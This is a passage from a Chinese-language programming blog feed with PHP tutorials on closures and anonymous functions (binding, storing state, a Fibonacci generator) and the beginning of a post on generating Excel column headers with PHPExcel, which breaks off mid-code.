title="什么时候用？"></a>什么时候用？</h3><p>由于是一段连续的空间，相比于运行时的碎片化产生的内容读取效率更高，所以，我们应将一些常用基础工具类设为静态，既避免了实例化时的资源消耗，有提升了书写体验。但要注意不能滥用<code>static</code>，曾经的一家知名公司内部项目model层全部是<code>static</code>方法，你能想象到这维护起来有多么让人崩溃。</p><hr><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.php.net/manual/zh/language.variables.scope.php" target="_blank" rel="noopener">使用静态变量 - PHP手册</a></li><li><a href="https://www.php.net/manual/zh/language.oop5.late-static-bindings.php" target="_blank" rel="noopener">后期静态绑定 - PHP手册</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈php闭包/匿名函数</title>
      <link href="/post/php-closure/"/>
      <url>/post/php-closure/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cm61t85qj30bo06o3ym.jpg" alt=""></p><p>闭包(Closure)是我们在编程中经常遇到的一个概念，但闭包究竟是什么？又有什么用呢？</p><a id="more"></a><p>在编程中，闭包与匿名函数（又名lambda表达式）其实是不同的概念，但两者经常同时使用。在 PHP 中，二者的概念不做区分，下文均以闭包指代。</p><h2 id="I-闭包是什么？"><a href="#I-闭包是什么？" class="headerlink" title="I. 闭包是什么？"></a>I. 闭包是什么？</h2><h3 id="闭包的常用类型"><a href="#闭包的常用类型" class="headerlink" title="闭包的常用类型"></a>闭包的常用类型</h3><p>闭包又名匿名函数，也就是没有函数名称的函数。我们先来看下常用类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个闭包，并把它赋给变量 $closure</span></span><br><span class="line">$closure = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用闭包也很简单</span></span><br><span class="line">$closure(); <span class="comment">//这样就调用了闭包，输出 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果要即时调用闭包，我们也可以这样写</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">7</span>;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当然更多的时候是把闭包作为参数(回调函数)传递给函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testClosure</span> <span class="params">(Closure $callback)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $callback();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $closure 作为参数传递给函数 testClosure，如果是普通函数是没有办法作为testClosure的参数的</span></span><br><span class="line">testClosure($closure);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以直接将定义的闭包作为参数传递，而不用提前赋给变量</span></span><br><span class="line">testClosure (<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭包不止可以做函数的参数，也可以作为函数的返回值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClosure</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">7</span>; &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = getClosure(); <span class="comment">// 函数返回的闭包就复制给 $c 了</span></span><br><span class="line">$c(); <span class="comment">// 调用闭包，返回 7</span></span><br></pre></td></tr></table></figure><h3 id="闭包类"><a href="#闭包类" class="headerlink" title="闭包类"></a>闭包类</h3><p>定义一个闭包函数，其实是产生了一个闭包类（Closure）的对象，Closure 类摘要如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Closure &#123;</span><br><span class="line">    <span class="comment">// 用于禁止实例化的构造函数</span></span><br><span class="line">    __construct ( void )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 复制一个闭包，绑定指定的$this对象和类作用域</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> bind ( Closure $closure , object $newthis [, mixed $newscope = <span class="string">'static'</span> ] ) : Closure</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 复制当前闭包对象，绑定指定的$this对象和类作用域</span></span><br><span class="line">    <span class="keyword">public</span> bindTo ( object $newthis [, mixed $newscope = <span class="string">'static'</span> ] ) : Closure</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过<code>var_dump($c instanceof Closure);</code>看到，闭包确实是<code>Closure</code>的一个实例，通过<code>var_dump(is_callable($c));</code>看到，闭包是<code>Callable</code>的数据类型。</p><h4 id="Closure-bind-实例"><a href="#Closure-bind-实例" class="headerlink" title="Closure::bind() 实例"></a><code>Closure::bind()</code> 实例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $cat = <span class="string">"cat"</span>;  </span><br><span class="line">    <span class="keyword">private</span> $dog = <span class="string">"dog"</span>;  </span><br><span class="line">    <span class="keyword">public</span> $pig = <span class="string">"pig"</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * 获取Animal类静态私有成员属性 </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line">$cat = <span class="keyword">static</span> <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> Animal::$cat;  </span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * 获取Animal实例私有成员属性 </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line">$dog = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dog;  </span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * 获取Animal实例公有成员属性 </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line">$pig = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pig;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$bindCat = Closure::bind($cat, <span class="keyword">null</span>, <span class="keyword">new</span> Animal());<span class="comment">// 给闭包绑定了Animal实例的作用域，但未给闭包绑定$this对象。这是由于静态闭包不能有绑定的对象（ newthis 参数的值应该设为 NULL）(详情请查看手册[Closure::bindTo页面文档](https://www.php.net/manual/zh/closure.bindto.php))</span></span><br><span class="line"></span><br><span class="line">$bindCat = Closure::bind($cat, <span class="keyword">new</span> Animal(), <span class="string">'Animal'</span>);<span class="comment">// 若$cat不是静态闭包时有效</span></span><br><span class="line"></span><br><span class="line">$bindDog = Closure::bind($dog, <span class="keyword">new</span> Animal(), <span class="string">'Animal'</span>);<span class="comment">// 给闭包绑定了Animal类的作用域，同时将Animal实例对象作为$this对象绑定给闭包  </span></span><br><span class="line"></span><br><span class="line">$bindPig = Closure::bind($pig, <span class="keyword">new</span> Animal());<span class="comment">// 将Animal实例对象作为$this对象绑定给闭包,保留闭包原有作用域  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $bindCat(),PHP_EOL;<span class="comment">// 根据绑定规则，允许闭包通过作用域限定操作符获取Animal类静态私有成员属性  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $bindDog(),PHP_EOL;<span class="comment">// 根据绑定规则，允许闭包通过绑定的$this对象(Animal实例对象)获取Animal实例私有成员属性  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $bindPig(),PHP_EOL;<span class="comment">// 根据绑定规则，允许闭包通过绑定的$this对象获取Animal实例公有成员属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bindTo与bind类似，是面向对象的调用方式，这里只举一个，其他类比就可以</span></span><br><span class="line">$bindCat = $cat-&gt;bindTo(<span class="keyword">null</span>, <span class="string">'Animal'</span>);<span class="comment">// 同样的，静态闭包不能绑定对象，因此$newthis为 null</span></span><br><span class="line"><span class="keyword">echo</span> $bindCat(); <span class="comment">// cat</span></span><br></pre></td></tr></table></figure><blockquote><p>如果未能指定作用域的范围，绑定后的闭包只能访问<code>public</code>属性的值。</p></blockquote><h4 id="Closure-bindTo-实例"><a href="#Closure-bindTo-实例" class="headerlink" title="Closure::bindTo() 实例"></a><code>Closure::bindTo()</code> 实例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;val = $val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getClosure</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//returns closure bound to this object and scope</span></span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;val; &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ob1 = <span class="keyword">new</span> A(<span class="number">1</span>);</span><br><span class="line">$ob2 = <span class="keyword">new</span> A(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">$cl = $ob1-&gt;getClosure();</span><br><span class="line"><span class="keyword">echo</span> $cl(), PHP_EOL;<span class="comment">// 1</span></span><br><span class="line">$cl = $cl-&gt;bindTo($ob2);<span class="comment">// 它与当前对象的函数体相同、绑定了同样变量，但可以绑定不同的对象，也可以绑定新的类作用域</span></span><br><span class="line"><span class="keyword">echo</span> $cl(), PHP_EOL;<span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h2 id="II-闭包有什么用？"><a href="#II-闭包有什么用？" class="headerlink" title="II. 闭包有什么用？"></a>II. 闭包有什么用？</h2><h3 id="1-储存变量"><a href="#1-储存变量" class="headerlink" title="1. 储存变量"></a>1. 储存变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeHelloWorld</span><span class="params">($name)</span> </span>&#123; </span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">()</span> <span class="title">use</span> <span class="params">($name, &amp;$i)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> $name; $i++; <span class="keyword">echo</span> $i.<span class="string">"\n"</span>; &#125;; </span><br><span class="line">&#125; </span><br><span class="line">$hello1 = makeHelloWorld(<span class="string">"wuying"</span>); </span><br><span class="line">$hello2 = makeHelloWorld(<span class="string">"wuying1"</span>); </span><br><span class="line">$hello1(); <span class="comment">//wuying1</span></span><br><span class="line">$hello1(); <span class="comment">//wuying2</span></span><br><span class="line">$hello1(); <span class="comment">//wuying3</span></span><br><span class="line">$hello2(); <span class="comment">//wuying11</span></span><br></pre></td></tr></table></figure><p>在这个示例中，<code>$hello1 = makeHelloWorld(&quot;wuying&quot;);</code>的作用是将参数<code>wuying1</code>传递给<code>makeHelloWorld()</code>，并接收其中的闭包作为返回值，因此，<code>$hello1</code>便成为了闭包，当我们执行<code>$hello1()</code>时，闭包开始执行。由于引用了闭包外的变量<code>$i</code>，所以每次的执行都修改了<code>$i</code>，所以最后依次输出了<code>wuying1</code>、<code>wuying2</code>、<code>wuying3</code>。</p><p>那么，为什么闭包可以存储变量呢？这是因为在没有闭包的语言中，变量的生命周期只限于创建它的环境。但在有闭包的语言中，只要有一个闭包引用了这个变量，它就会一直存在。</p><blockquote><p>另一种在局部函数中储存变量的方式是使用<code>static</code>关键字，其原理是将变量存储于静态存储区，而非普通变量存储的栈区，详见另一篇文章<a href="http://blog.palemoky.top/2019/09/18/浅谈PHP中的static关键字/">浅谈PHP中的static关键字</a>。</p></blockquote><h3 id="2-延时执行函数"><a href="#2-延时执行函数" class="headerlink" title="2. 延时执行函数"></a>2. 延时执行函数</h3><p>比如，我们在 JavaScript 中每隔 1 秒钟输出一个随机数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="built_in">Math</span>.random())&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>在这个例子中，我们对闭包进行了多次调用，而且不是调用时即时执行。</p><h3 id="3-对处理逻辑封装，形成更好的一体封装"><a href="#3-对处理逻辑封装，形成更好的一体封装" class="headerlink" title="3. 对处理逻辑封装，形成更好的一体封装"></a>3. 对处理逻辑封装，形成更好的一体封装</h3><p>如果在有闭包前，我们需要单独创建具名函数，然后使用名称引用这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$func = <span class="function"><span class="keyword">function</span><span class="params">($value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $value * <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">print_r(array_map($func, range(<span class="number">1</span>, <span class="number">5</span>)));</span><br></pre></td></tr></table></figure><p>但这样把回调与使用分离，而闭包的出现就很好的解决了这个问题。</p><p>而由于闭包的封装性，闭包内无法访问包外变量，但我们可以通过<code>use</code>关键字来引入外部变量，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$quantity = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">($price)</span> <span class="title">use</span> <span class="params">($quantity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $price * $quantity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来一个例子，使用闭包打印斐波那契数列。我们知道斐波那契数列有下面的规律：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># f(<span class="built_in">n</span>) 表示数列中第 <span class="built_in">n</span> 个数的值</span><br><span class="line">f(<span class="built_in">n</span>) = <span class="number">0</span>; (<span class="built_in">n</span> = <span class="number">0</span>)</span><br><span class="line">f(<span class="built_in">n</span>) = <span class="number">1</span>; (<span class="built_in">n</span> = <span class="number">1</span>)</span><br><span class="line">f(<span class="built_in">n</span>) = f(<span class="built_in">n</span>-<span class="number">1</span>)+f(<span class="built_in">n</span>-<span class="number">2</span>); (<span class="built_in">n</span> &gt;= <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>使用递归的方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibonacci</span><span class="params">(int $n)</span>: <span class="title">int</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($n &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fibonacci($n<span class="number">-1</span>) + fibonacci($n<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> fibonacci(<span class="number">10</span>), <span class="string">"\n"</span>; <span class="comment">// 55</span></span><br></pre></td></tr></table></figure><p>如果打印数列，那每一次都需要重复计算前面已经计算过的数据（只需要前两个就好）。可以使用闭包保存上一次的运行环境。</p><p>php 版本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fibonacci = <span class="function"><span class="keyword">function</span> <span class="params">()</span>: <span class="title">callable</span> </span>&#123;</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $y = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">(&amp;$x, &amp;$y)</span>: <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($x, $y) = [$y, $x+$y];</span><br><span class="line">        <span class="keyword">return</span> $x;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$f = $fibonacci();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">10</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $f() , <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>js 版本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fibonacci = <span class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">0</span>, y = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">        [x, y] = [y, x+y];</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f = fibonacci();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(f());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>合理使用闭包，能够让我们的代码更加清晰、更加灵活。</p><hr><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://xueyuanjun.com/post/4341.html/page/2#comments" target="_blank" rel="noopener">闭包和匿名函数-学院君</a></li><li><a href="https://www.bilibili.com/video/av67412371" target="_blank" rel="noopener">闭包的编程思想-B站</a></li><li><a href="https://zh.wikipedia.org/wiki/闭包_(计算机科学)" target="_blank" rel="noopener">闭包-维基百科</a></li><li><a href="https://www.php.net/manual/zh/class.closure.php" target="_blank" rel="noopener">Closure类-PHP手册</a></li><li><a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">Callable-PHP手册</a></li><li><a href="https://learnku.com/articles/4625/php-closure-closure" target="_blank" rel="noopener">PHP 闭包（Closure）-LearKu</a></li><li><a href="https://learnku.com/articles/7469/learn-the-closure-function-closures" target="_blank" rel="noopener">学习一下闭包函数 - LearKu</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 导出 Excel 问题</title>
      <link href="/post/excel-export/"/>
      <url>/post/excel-export/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g7bm2k9dm2j30xc0hiq3v.jpg" alt=""></p><a id="more"></a><p>我们在工作中经常会遇到 Excel 导出的问题，比如：</p><ol><li>表格内容的填充</li><li>下载数据过大执行超时、内存溢出</li><li>异步导出</li></ol><p>那么，这些问题应该怎样解决呢？</p><h1 id="1-表格内容的填充"><a href="#1-表格内容的填充" class="headerlink" title="1. 表格内容的填充"></a>1. 表格内容的填充</h1><p>我们知道，在 PHP 中，<a href="https://www.php.net/manual/en/function.ord.php" target="_blank" rel="noopener"><code>ord()</code></a>可将字符转换为 ASCII 码，<a href="https://www.php.net/manual/en/function.chr.php" target="_blank" rel="noopener"><code>chr()</code></a>则可以将 ASCII 码转换为对应字符，二者为互补函数。</p><p>通过查看 Excel，我们知道一个 sheet 中，列序号是 <code>A1, B1, C1 ...</code>递增的，而行序号是<code>A2, A3, A4...</code>递增的。下面，就让我们用代码来生成一下Excel 中的列。</p><h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$rawData = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'张三'</span>,</span><br><span class="line">        <span class="string">'gender'</span> =&gt; <span class="string">' 男'</span>,</span><br><span class="line">        <span class="string">'age'</span> =&gt; <span class="number">19</span>,</span><br><span class="line">        <span class="string">'birthday'</span> =&gt; <span class="string">'2000-01-01'</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'李四'</span>,</span><br><span class="line">        <span class="string">'gender'</span> =&gt; <span class="string">'男'</span>,</span><br><span class="line">        <span class="string">'age'</span> =&gt; <span class="number">29</span>,</span><br><span class="line">        <span class="string">'birthday'</span> =&gt; <span class="string">'1990-01-01'</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">//拼装导出数据</span></span><br><span class="line">$sheetData = [</span><br><span class="line">    <span class="string">'姓名'</span> =&gt; array_column($rawData, <span class="string">'name'</span>),</span><br><span class="line">    <span class="string">'性别'</span> =&gt; array_column($rawData, <span class="string">'gender'</span>),</span><br><span class="line">    <span class="string">'年龄'</span> =&gt; array_column($rawData, <span class="string">'age'</span>),</span><br><span class="line">    <span class="string">'生日'</span> =&gt; array_column($rawData, <span class="string">'birthday'</span>),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$excelObj = <span class="keyword">new</span> \PHPExcel();</span><br><span class="line">$sheet    = $excelObj-&gt;getActiveSheet();</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成导出表格</span></span><br><span class="line">$i = <span class="number">65</span>;<span class="comment">//A 在 ASCII 中的十进制为 65</span></span><br><span class="line"><span class="keyword">foreach</span> ($sheetData <span class="keyword">as</span> $title =&gt; $datum) &#123;</span><br><span class="line">    <span class="comment">//填充表头</span></span><br><span class="line">    $row = chr($i++);</span><br><span class="line">    $sheet-&gt;setCellValue($row . <span class="string">'1'</span>, $title);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//填充内容</span></span><br><span class="line">    $j = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($datum <span class="keyword">as</span> $item) &#123;</span><br><span class="line">        $sheet-&gt;setCellValueExplicit($row . $j++, $item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优点：可随导出内容自适应，扩展性强</p><p>缺点：表头只能兼容到<code>A1~Z1</code>，超过<code>Z1</code>则会触发 bug 而无法导出</p><h1 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h1><p>针对方案一的缺点，我们来扩展表头的容量，利用PHP中的字符串递增来生成表头。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="string">'A'</span>; $i &lt;= <span class="string">'Z'</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $i . <span class="string">'1'</span>, PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优点：简单快速生成表头</p><p>缺点：只能兼容到<code>YZ1</code></p><p>在 Microsoft Office 365 2019 中，最大列为<code>XFD</code>，所以，如果要满足 Excel 的导出，我们可以这样完全兼容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$alphabet = [];</span><br><span class="line"><span class="keyword">for</span>($i = <span class="string">'A'</span>; $i &lt; <span class="string">'ZZZ'</span>; $i++) &#123;</span><br><span class="line">    $alphabet[] = $i . <span class="string">'1'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，现在我们已经能够完全满足 Excel 的列需求了，但这里还有一点小瑕疵：我们生成的所有数据都存储在数组中，这显然是对内存的极大浪费，应该按需存取。我们再来尝试另一种新的方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 